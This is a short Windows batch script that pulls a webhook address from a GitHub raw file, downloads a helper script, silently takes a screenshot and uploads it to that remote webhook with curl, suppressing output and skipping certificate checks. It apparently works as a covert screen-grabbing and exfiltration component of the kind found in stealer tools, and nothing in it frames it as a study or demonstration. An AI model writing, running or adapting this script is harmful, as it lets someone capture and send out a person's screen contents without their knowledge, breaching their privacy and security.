for /f %%a in ('Powershell -Command "irm https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/url"') do set webhook=%%a
if not exist %TEMP%\wstemp md %TEMP%\wstemp
pushd %TEMP%\wstemp
if not exist %TEMP%\wstemp\screenCapture.bat powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat" >>"%TEMP%\wstemp\screenCapture.bat"
call screenCapture screenshot.png >nul
curl -k -F "payload_json={\"content\": \"\"}" -F "file1=@screenshot.png" %WEBHOOK% >nul
echo %CD%
popd
